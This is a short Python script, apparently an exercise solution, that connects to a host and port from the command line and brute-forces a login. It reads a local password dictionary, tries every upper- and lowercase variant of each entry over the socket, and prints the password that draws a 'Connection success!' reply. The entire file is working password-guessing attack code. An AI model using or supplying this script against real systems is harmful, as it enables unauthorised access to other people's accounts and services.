import socket
import sys
import itertools

with (socket.socket() as cs):
    hostname = sys.argv[1]
    port = int(sys.argv[2])

    address = (hostname, port)
    cs.connect(address)

    found = False

    file_path = "C:/Users/bullb/Downloads/passwords.txt"

    with open(file_path, 'r') as file:
        for line in file:
            iter_ = map(lambda x: ''.join(x),
                        itertools.product(*([chr_.lower(), chr_.upper()] for chr_ in line.replace("\n", ""))))
            for it in iter_:
                if found:
                    break
                pw = it.encode()
                cs.send(pw)
                response = cs.recv(1024).decode()
                if 'Connection success!' in response:
                    print(pw.decode())
                    found = True
                    break